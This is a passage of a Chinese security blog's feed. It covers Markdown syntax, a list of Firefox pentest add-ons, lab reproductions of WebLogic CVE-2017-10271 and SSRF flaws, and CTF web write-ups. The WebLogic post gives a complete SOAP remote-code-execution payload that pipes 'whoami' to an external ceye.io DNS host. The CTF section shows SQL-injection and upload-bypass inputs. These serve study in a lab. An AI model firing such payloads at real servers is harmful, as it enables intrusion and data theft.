style="text-align:right">大哥</td></tr><tr><td>关羽</td><td style="text-align:center">打</td><td style="text-align:right">二哥</td></tr><tr><td>张飞</td><td style="text-align:center">骂</td><td style="text-align:right">三弟</td></tr></tbody></table><p>语法：</p><p>单行代码：代码之间分别用一个反引号包起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`代码内容`</span><br></pre></td></tr></table></figure><p>代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码...</span><br><span class="line">代码...</span><br><span class="line">代码...</span><br></pre></td></tr></table></figure><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flow</span><br><span class="line">st=&gt;start: 开始</span><br><span class="line">op=&gt;operation: My Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br><span class="line">&amp;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="1.png" alt></p><h1 id="为文字添加背景色"><a href="#为文字添加背景色" class="headerlink" title="为文字添加背景色"></a>为文字添加背景色</h1><p>由于 style 标签和标签的 style 属性不被支持，所以这里只能是借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色。故这里对于文字背景色的设置，只是将那一整行看作一个表格，更改了那个格子的背景色（bgcolor）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;背景色yellow&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><table><tr><td bgcolor="yellow">背景色yellow</td></tr></table><h1 id="更改字体、大小、颜色"><a href="#更改字体、大小、颜色" class="headerlink" title="更改字体、大小、颜色"></a>更改字体、大小、颜色</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;font face=&quot;黑体&quot;&gt;我是黑体字&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;;/font&gt;</span><br><span class="line">&lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt;</span><br><span class="line">&lt;font color=red&gt;我是红色&lt;/font&gt;</span><br><span class="line">&lt;font color=#008000&gt;我是绿色&lt;/font&gt;</span><br><span class="line">&lt;font color=Blue&gt;我是蓝色&lt;/font&gt;</span><br><span class="line">&lt;font size=5&gt;我是尺寸&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;黑体&quot; color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><font face="黑体">我是黑体字</font><br><font face="微软雅黑">我是微软雅黑&lt;;/font&gt;<br><font face="STCAIYUN">我是华文彩云</font><br><font color="red">我是红色</font><br><font color="#008000">我是绿色</font><br><font color="Blue">我是蓝色</font><br><font size="5">我是尺寸</font><br><font face="黑体" color="green" size="5">我是黑体，绿色，尺寸为5</font></font>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Markdown基本语法&lt;/p&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Markdown" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Markdown/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Firefox渗透插件—Web渗透必备工具</title>
    <link href="http://archimesan.me/2018/02/04/Firefox%E6%B8%97%E9%80%8F%E6%8F%92%E4%BB%B6%E2%80%94Web%E6%B8%97%E9%80%8F%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7/"/>
    <id>http://archimesan.me/2018/02/04/Firefox渗透插件—Web渗透必备工具/</id>
    <published>2018-02-04T09:13:28.000Z</published>
    <updated>2019-03-25T02:12:15.884Z</updated>
    
    <content type="html"><![CDATA[<p>工欲善必先利其器，firefox一直是各位渗透师必备的利器，我这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。</p><a id="more"></a><p><img src="1.jpg" alt></p><p>1：<font color="#FF0000"> Firebug </font> </p><p>Firefox的 五星级强力推荐插件之一，不许要多解释</p><p>2：<font color="#FF0000"> User Agent Switcher </font> </p><p>改变客户端的User Agent的一款插件</p><p>3：<font color="#FF0000"> Hackbar </font> </p><p>攻城师们的必备工具，提供了SQL注入和XSS攻击，能够快速对字符串进行各种编码。</p><p>4：<font color="#FF0000"> HttpFox </font> </p><p>监测和分析浏览器与web服务器之间的HTTP流量</p><p>5：<font color="#FF0000"> Live HTTP Headers </font> </p><p>即时查看一个网站的HTTP头</p><p>6：<font color="#FF0000"> Tamper Data </font> </p><p>查看和修改HTTP/HTTPS头和POST参数</p><p>7：<font color="#FF0000"> ShowIP </font> </p><p>在状态栏显示当前页的IP地址、主机名、ISP、国家和城市等信息。</p><p>8：<font color="#FF0000"> OSVDB </font> </p><p>开放源码的漏洞数据库检索</p><p>9: <font color="#FF0000"> Packet Storm search plugin </font> </p><p>Packet Storm提供的插件，可以搜索漏洞、工具和exploits等。</p><p>10：<font color="#FF0000"> Offsec Exploit-db Search </font> </p><p>搜索Exploit-db信息</p><p>11：<font color="#FF0000"> Security Focus Vulnerabilities Search Plugin </font> </p><p>在Security Focus上搜索漏洞</p><p>12：<font color="#FF0000"> Cookie Watcher </font> </p><p>在状态栏显示cookie</p><p>13: <font color="#FF0000"> Header Spy </font> </p><p>在状态栏显示HTTP头</p><p>14：<font color="#FF0000"> Groundspeed </font> </p><p>Manipulate the application user interface.</p><p>15：<font color="#FF0000"> CipherFox </font> </p><p>在状态栏显示当前SSL/TLS的加密算法和证书</p><p>16：<font color="#FF0000"> XSS Me </font> </p><p>XSS测试扩展</p><p>17：<font color="#FF0000"> SQL Inject Me </font> </p><p>SQL注入测试扩展</p><p>18：<font color="#FF0000"> Wappalyzer </font> </p><p>查看网站使用的应用程序</p><p>19：<font color="#FF0000"> Poster </font> </p><p>发送与Web服务器交互的HTTP请求，并查看输出结果</p><p>20：<font color="#FF0000"> Javascript Deobfuscator </font> </p><p>显示网页上运行的Javascript代码</p><p>21：<font color="#FF0000"> Modify Headers </font> </p><p>修改HTTP请求头</p><p>22：<font color="#FF0000"> FoxyProxy </font> </p><p>代理工具</p><p>23：<font color="#FF0000"> FlagFox </font> </p><p>可以在地址栏或状态栏上显示出当前网站所在国家的国旗，也有更多的其他功能，如：双击国旗可以实现WOT功能；鼠标中键点击是whois功能。当然用户可以在选项里设置快捷键实现诸如复制IP，维基百科查询等功能。</p><p>24：<font color="#FF0000"> Greasemonkey </font> </p><p>greasemonkey 使你可以向任何网页添加DHTML语句(用户脚本)来改变它们的显示方式。就像CSS可以让你接管网页的样式，而用户脚本(User Script)则可以让你轻易地控制网页设计与交互的任何方面。例如:</p><ul><li>使页面上显示的 URL 都成为可以直接点击进入的链接。 <em> 增强网页实用性，使你经常访问的网站更符合你的习惯。 </em> 绕过网站上经常出现的那些烦人的 Bug。</li></ul><p>25：<font color="#FF0000"> Domain Details </font> </p><p>显示服务器类型、IP地址、域名注册信息等</p><p>26：<font color="#FF0000"> Websecurify </font> </p><p>Websecurify是WEB安全检测软件的Firefox的扩展，可以针对Web应用进行安全评估</p><p>27：<font color="#FF0000"> XSSed Search </font> </p><p>搜索XSSed.Com跨站脚本数据库</p><p>28：<font color="#FF0000"> ViewStatePeeker </font> </p><p>查看asp.net的iewState</p><p>29：<font color="#FF0000"> CryptoFox </font> </p><p>破解MD5、加密/解密工具</p><p>30：<font color="#FF0000"> WorldIP </font> </p><p>显示服务器的IP、地址、PING、Traceroute、RDNS等信息</p><p>31：<font color="#FF0000"> Server Spy </font> </p><p>识别访问的web服务器类型，版本以及IP地址的插件</p><p>32：<font color="#FF0000"> Default Passwords </font> </p><p>搜索CIRT.net默认密码数据库。</p><p>33：<font color="#FF0000"> Snort IDS Rule Search </font> </p><p>搜索Snort的IDS规则，做签名开发的应该很有用。</p><p>34：<font color="#FF0000"> FireCAT </font> </p><p>FireCAT (Firefox Catalog of Auditing exTensions) 是一个收集最有效最有用的应用程序安全审计和风险评估工具的列表(这些工具以Firefox插件形式发布的),FireCAT中没有收集的安全工具类型包 括:fuzzer,代理和应用程序扫描器.</p><p>原文转自：<a href="http://www.91ri.org/4441.html" target="_blank" rel="noopener">http://www.91ri.org/4441.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工欲善必先利其器，firefox一直是各位渗透师必备的利器，我这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。&lt;/p&gt;
    
    </summary>
    
      <category term="软件安装与使用" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    
      <category term="Firefox渗透插件" scheme="http://archimesan.me/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/Firefox%E6%B8%97%E9%80%8F%E6%8F%92%E4%BB%B6/"/>
    
    
      <category term="工具" scheme="http://archimesan.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic XMLDecoder反序列化漏洞复现</title>
    <link href="http://archimesan.me/2018/02/03/WebLogic%20XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://archimesan.me/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/</id>
    <published>2018-02-03T08:36:08.000Z</published>
    <updated>2019-03-25T02:35:44.138Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2017-10271</p><a id="more"></a><p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>  Oracle WebLogic Server 10.3.6.0.0版本</p><p>  Oracle WebLogic Server 12.1.3.0.0版本</p><p>  Oracle WebLogic Server 12.2.1.1.0版本</p><h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure><p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>访问 <a href="http://127.0.0.1:7001/wls-wsat/CoordinatorPortType" target="_blank" rel="noopener">http://127.0.0.1:7001/wls-wsat/CoordinatorPortType</a></p><p><img src="1.png" alt></p><p>存在该漏洞组件</p><p>用burpsuite抓包访问</p><p>改包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.30.146:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv:11.0) like Gecko</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 646</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;java version=<span class="string">"1.8.0_131"</span> class=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span><br><span class="line">  &lt;void class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">&lt;array class=<span class="string">"java.lang.String"</span> length=<span class="string">"3"</span>&gt;</span><br><span class="line">  &lt;void index=<span class="string">"0"</span>&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"1"</span>&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"2"</span>&gt;</span><br><span class="line">&lt;string&gt;ping `whoami`.ip.port.eu04a0.ceye.io&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">  &lt;void method=<span class="string">"start"</span>/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">  &lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="3.png" alt></p><p>查看ceye平台的DNS查询记录，发现服务器成功执行whoami命令并将结果拼接到ping命令中执行，用户名成功返回到DNS查询记录中：</p><p><img src="4.png" alt></p><p>ps:</p><p>使用ceye平台查看DNS查询记录<br>网站地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/profile</span><br></pre></td></tr></table></figure></p><p><img src="2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2017-10271&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞学习" scheme="http://archimesan.me/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Weblogic" scheme="http://archimesan.me/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/Weblogic/"/>
    
    
      <category term="序列化" scheme="http://archimesan.me/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>weblogic ssrf 漏洞复现</title>
    <link href="http://archimesan.me/2018/02/02/weblogic%20ssrf%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://archimesan.me/2018/02/02/weblogic ssrf 漏洞复现/</id>
    <published>2018-02-02T07:41:23.000Z</published>
    <updated>2019-03-25T02:27:12.019Z</updated>
    
    <content type="html"><![CDATA[<p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><a id="more"></a><h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure><p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>访问 <a href="http://your-ip:7001/uddiexplorer/，无需登录即可查看" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/，无需登录即可查看</a> uddiexplorer 应用。</p><h1 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h1><p>SSRF漏洞存在于 <a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在</a> brupsuite 下测试该漏洞。访问一个可以访问的 IP:PORT，如 <a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a></p><p>访问：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure></p><p><img src="1.png" alt></p><p>修改为一个不存在的端口，将会返回could not connect over HTTP to server。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure><p><img src="2.png" alt></p><p>通过错误的不同，即可探测内网状态。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞学习" scheme="http://archimesan.me/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Weblogic" scheme="http://archimesan.me/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/Weblogic/"/>
    
    
      <category term="ssrf" scheme="http://archimesan.me/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>西普实验吧-web</title>
    <link href="http://archimesan.me/2018/02/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-web/"/>
    <id>http://archimesan.me/2018/02/01/西普实验吧-web/</id>
    <published>2018-02-01T09:19:44.000Z</published>
    <updated>2019-03-25T02:31:53.613Z</updated>
    
    <content type="html"><![CDATA[<p>西普实验吧-web题目学习</p><a id="more"></a><h2 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h2><p><img src="1-1.png" alt></p><p><img src="1-2.png" alt></p><p>用sqlmap跑一下</p><p>用户密码跑出来就行了。</p><h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p><img src="2-1.png" alt></p><p><img src="2-2.png" alt></p><p><img src="2-3.png" alt></p><p>提交即可。</p><h2 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h2><p><img src="3-1.png" alt></p><p><img src="3-2.png" alt></p><p><img src="3-3.png" alt></p><p>总结：<br>zh-CN<br>zh-hk  小写<br>en-gb<br>.NET CLR 9.9<br>IE<br>x-forwarded-for:1.1.1.1</p><h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p><img src="4-1.png" alt></p><p><img src="4-2.png" alt></p><p><img src="4-3.png" alt></p><h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p><img src="5-1.png" alt></p><p><img src="5-2.png" alt></p><p><img src="5-3.png" alt></p><h2 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h2><p><img src="6-1.png" alt></p><p><img src="6-2.png" alt></p><p>普通的数字型显错注入</p><p><img src="6-3.png" alt></p><h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><img src="7-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure><p>hackerDJ 经过两次urlencode即可</p><p><img src="7-2.png" alt></p><h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><p><img src="8-1.png" alt></p><p><img src="8-2.png" alt></p><p>直接复制到浏览器的console运行即可</p><p><img src="8-3.png" alt></p><h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p><img src="9-1.png" alt></p><p><img src="9-2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">"********, "</span>*****<span class="string">", "</span>********<span class="string">");</span></span><br><span class="line"><span class="string">mysql_select_db("</span>phpformysql<span class="string">") or die("</span>Could not select database<span class="string">");</span></span><br><span class="line"><span class="string">if (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="string">die("</span>Connection failed: <span class="string">" . mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span></span><br><span class="line"><span class="string"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br><span class="line"><span class="string"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="string">if (!<span class="variable">$query</span>) &#123;</span></span><br><span class="line"><span class="string">printf("</span>Error: %s\n<span class="string">", mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span></span><br><span class="line"><span class="string">//echo <span class="variable">$row</span>["</span>pw<span class="string">"];</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  if ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span></span><br><span class="line"><span class="string">echo "</span>&lt;p&gt;Logged <span class="keyword">in</span>! Key:************** &lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else &#123;</span></span><br><span class="line"><span class="string">    echo("</span>&lt;p&gt;Log <span class="keyword">in</span> failure!&lt;/p&gt;<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>直接用户写  ‘union select md5(1)#    密码写 1  即可绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pw from php <span class="built_in">where</span> user=<span class="string">''</span> union select md5(1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="9-3.png" alt></p><h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><img src="10-1.png" alt></p><p><img src="10-2.png" alt></p><p>写个逆运算即可 </p><p>python脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>.encode(<span class="string">'rot13'</span>)[::-1].decode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">""</span>.join([chr(ord(i)-1) <span class="keyword">for</span> i <span class="keyword">in</span> a])[::-1]</span><br></pre></td></tr></table></figure></p><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><img src="11-1.png" alt></p><p><img src="11-2.png" alt></p><p>通过%00截断</p><p><img src="11-3.png" alt></p><h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p><img src="12-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> 